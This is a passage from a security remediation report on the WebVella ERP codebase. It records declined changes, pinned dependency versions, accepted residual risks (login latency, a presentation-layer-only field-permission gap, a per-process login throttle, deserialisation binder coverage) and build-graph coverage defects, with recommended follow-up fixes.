* **Adding any new package dependency whatsoever** — every control this remediation introduces resolves
  from the `Microsoft.AspNetCore.App` framework reference already present at
  `WebVella.Erp/WebVella.Erp.csproj:L43`: the password hasher, the rate limiter, the antiforgery
  services, the HSTS and HTTPS-redirection middleware, the data-protection stack, the web encoders and
  the serialisation-binder interface.
* **Any change to the Blazor WebAssembly *Client* project.** Its outbound HTTP usage is browser-side and
  server-side request forgery was proven not applicable (`L-09`). The one client-side change that *was*
  made — ending the server session on logout — is a session-revocation fix, not an SSRF one.

**Two of the six Fix Implementation Standards are what make several of the declinations above correct,
so they are named rather than left implicit.** The **Injection Prevention** standard's
parameterised-query clause was *already satisfied* for values throughout the data layer, which is why
the injection exposure was genuinely confined to concatenated schema identifiers and why no wider
change to the query surface was warranted. And the **Dependency Updates** standard is what bounds the
version work: its instruction is to update dependencies carrying known Critical or High advisories, pin
versions and replace end-of-life libraries — not to raise every package to its newest release. That
distinction is the whole reason for the next paragraph.

**Dependency versions deliberately left alone.** All **30** other active packages were checked against
the advisory database and are clean, so no gratuitous change is made — guideline 7 in practice:

* **`Npgsql [9.0.4]`** at `WebVella.Erp/WebVella.Erp.csproj:L61` — a newer data provider exists, but
  the pinned version is **already safe**: the provider's only advisory does not reach the 9.x line at
  all. Upgrading would be change without remediation.
* **`Newtonsoft.Json` 13.0.4** — past **both** of its historical advisories.
* **`System.IdentityModel.Tokens.Jwt` 8.15.0** — beyond every version its advisories affect.

Exactly four version changes were made, and each closes a confirmed advisory or an
unsupported-component finding; they are inventoried in
[`LIBRARIES.md`](https://github.com/Blitzy-Sandbox/blitzy-WebVella-ERP/blob/master/LIBRARIES.md).

**Solution-file hygiene, declined and routed here rather than silently fixed.** The frozen scope
authorises exactly one change to
[`WebVella.ERP3.sln`](https://github.com/Blitzy-Sandbox/blitzy-WebVella-ERP/blob/master/WebVella.ERP3.sln) —
the project-reference path-casing repair that closed `H-19`. Everything else in that file is therefore
documented, not remediated:

* The solution-items entry `..\Users\rumen.yankov\Desktop\postgresql.conf` at `WebVella.ERP3.sln:L13`
  points outside the repository, at a developer's desktop that no longer exists. Pre-existing litter; it
  affects no build, because solution items are not compiled.
* `INSTRUCTIONS.md`, `home.PNG` and `internal.PNG` at `:L8-L10` are listed as solution items but
  contribute nothing to any build. Also pre-existing litter.
* **`Directory.Build.props` and `SECURITY.md` were deliberately *not* added** to the *Resources* or
  *Solution Items* folders. Both are new files this engagement created, and adding them to a solution
  folder is organisational preference rather than remediation — and it would edit a build-integrity file
  beyond its single authorised change. `Directory.Build.props` is **directory**-scoped, so it already
  reaches all 19 projects by location regardless of solution membership; listing it would change nothing
  functional.

**Recommended fix for all four:** correct them together in a dedicated solution-hygiene change, once an
owner widens the authorisation on that file. They are cosmetic, and bundling them into a security commit
would break the one-class-per-commit discipline for no security gain.

## Further accepted risks — latency, field permissions, throttle scope and binder coverage

Four residuals that are not findings in their own right, recorded here because each is a consequence of
a fix rather than a pre-existing weakness, and each is owned rather than absorbed.

**Login latency rises, by design.** A high-iteration key-derivation function is *deliberately* slow —
that is the entire point of the control, and making it fast would defeat it. This is the one
**pre-declared, accepted exception** to the engagement's 10 % performance boundary. It is declared here
rather than discovered later as a regression, and it is **confined to the authentication path**: no other
request path performs key derivation, so no other path is affected. Measured on a live database, every
failing credential path now costs about 120–123 ms and every successful one about the same, which is the
intended cost of closing `C-03`. Equalising those paths was itself required — see RISK-003 and the
timing work recorded in [the remediation log](remediation-log.md) — because a *fast* failure would have
leaked whether an account exists.

**The residual general field-permission gap.** `C-02` was fixed **surgically**: administrator-only read
and update permissions assigned to the password field, plus redaction of any field already carrying the
encrypted flag from read projections, so a hash never leaves the server regardless of role. It was
**not** fixed by porting field-permission enforcement into every read and write projection. That broader
change would ripple through 23 field types and every projection, and because
`WebVella.Erp.Web/Components/PcFieldBase/PcFieldBase.cs:L610` treats an **empty** read permission as
**denial**, a blanket port would hide fields wholesale across working screens — a far larger functional
risk than the finding it would close.

So the general gap remains: **field permissions are enforced in the presentation layer, and a caller
that bypasses that layer is not stopped by the data layer.** Stating that plainly matters, because it
carries a correction to the platform's own specification — the specification's claim that field
permissions are resolved per field during read and write projection is **disproven by the code**. That
correction is recorded in [the security audit report](security-audit-report.md), which is where
specification corrections belong; it is cross-referenced here so the residual and its correction are not
read apart from each other. **Recommended fix:** resolve field permissions inside the projection layer
behind a feature switch defaulted off, migrate screen by screen with the empty-permission-means-denial
semantics corrected first, and only then remove the switch.

**The login throttle's protection is per-process.** It is backed by the **existing** in-process cache at
`WebVella.Erp.Web/Utils/Cache.cs` — 54 lines wrapping `IMemoryCache` — which is what avoided both a
schema change and a new dependency, and is therefore the least invasive control available (guideline 5).
The consequence is stated rather than hidden: throttle state neither spans instances nor survives a
restart, so a multi-instance deployment enforces the five-attempt bound once **per instance** rather than
once overall. It **fails closed** on cache eviction rather than granting unlimited attempts. A
distributed backing store is a **recommendation, not a fix** — it appears in the ongoing recommendations
and as RISK-008. **Do not confuse that live file with the dead 61-line
`WebVella.Erp.Web/Security/AuthCache.cs`, which is `L-01` content and has no callers at all.**

**Deserialisation binder coverage — a correction upward, not a residual.** An intermediate assessment
recorded six polymorphic-deserialisation sites as remaining unbound, in
`WebVella.Erp/Jobs/JobDataService.cs` and `WebVella.Erp/Notifications/NotificationContext.cs`. **That is
no longer true and is corrected here rather than repeated.** A repository-wide census at this commit
finds **20** `TypeNameHandling` assignment sites across **6** files, and **every one** of them attaches
`SerializationBinder = ErpSerializationBinder.Instance` — including `JobDataService.cs` at `:L32`,
`:L101`, `:L302` and `:L351`, and `NotificationContext.cs` at `:L115` and `:L160`. There is no unbound
site left to accept. Recording the correction is the point: claiming a residual that has since been
closed would misstate the posture just as surely as claiming coverage that does not exist.

What *is* still accepted here is the shape of the control rather than its reach. `TypeNameHandling` is
**retained** rather than removed, because already-persisted job arguments and entity and relation
documents carry `$type` discriminators and would fail to deserialise without it — removing it would
break existing installations. Constraining resolution to an enumerated first-party allow-list preserves
that round-tripping while closing the weakness. **Recommended fix, for a change permitted to migrate
data:** rewrite the stored documents without type discriminators, then set `TypeNameHandling.None` and
retire the binder. That is a data migration, not a code change, which is why it is a recommendation.

## Build-graph and gate coverage — defects found while making the scan trustworthy

The audit's premise for elevating the build-graph finding was that **a clean scan taken from an
incomplete graph is worthless**. Applying that premise to the WebAssembly trio surfaced two further
defects. Both are recorded here, with their current state, because one is closed and one is not, and
conflating them would overstate the posture.

* **The Server project's `ProjectReference` named a file that never existed — now closed.**
  `WebVella.Erp.WebAssembly/Server/WebVella.Erp.WebAssembly.Server.csproj` referenced
  `..\Client\WebVella.Erp.WebAssembly.Client.csproj`. There is no such file: the real Client manifest is
  `WebVella.Erp.WebAssembly/Client/WebVella.Erp.WebAssembly.csproj`, with no `.Client` suffix — and
  `WebVella.ERP3.sln:L55` had always referenced it **correctly**, which is what made the mismatch
  visible. MSBuild skipped the missing project silently (`MSB9008`), so the Client dropped out of the
  Server's restore, audit and analyzer graph, and the Server project was **structurally unbuildable**
  rather than merely unscanned. The filename is corrected at `:L17`, with the reason recorded in the
  manifest itself.
* **Neither the `Server` nor the `Shared` project is a member of the solution — still open, and
  accepted.** `WebVella.ERP3.sln:L55` lists only the Client project, and `grep -c '^Project('` returns
  **19**, which is 17 code projects plus 2 solution folders. A solution-level restore or build therefore
  never reaches those two, so a single-command gate cannot cover them.

**Why the second is accepted rather than fixed.** Enrolling the two projects in the solution was
attempted and reverted **twice**: the frozen scope authorises exactly one change to `WebVella.ERP3.sln`,
so changing solution membership is scope drift in a build-integrity file. Coverage is instead complete
at 19 by **two routes rather than one** — the solution command for 17, plus dedicated restore, build and
advisory steps for the remaining two, with a workflow step asserting that every tracked `.csproj` sits in
exactly one of the two sets so a new project cannot fall between them. The analyzer half needs no
special handling at all, because `Directory.Build.props` is directory-scoped and reaches both projects by
location regardless of membership. This is carried as RISK-030.

**Recommended fix:** with an owner's authorisation to widen the change to `WebVella.ERP3.sln`, add both
projects to the solution and collapse the two coverage routes into one. Worth noting even then: the
per-project steps assert each resolved `TargetFramework` explicitly, which a successful solution build
does not, so they are worth keeping alongside rather than deleting.
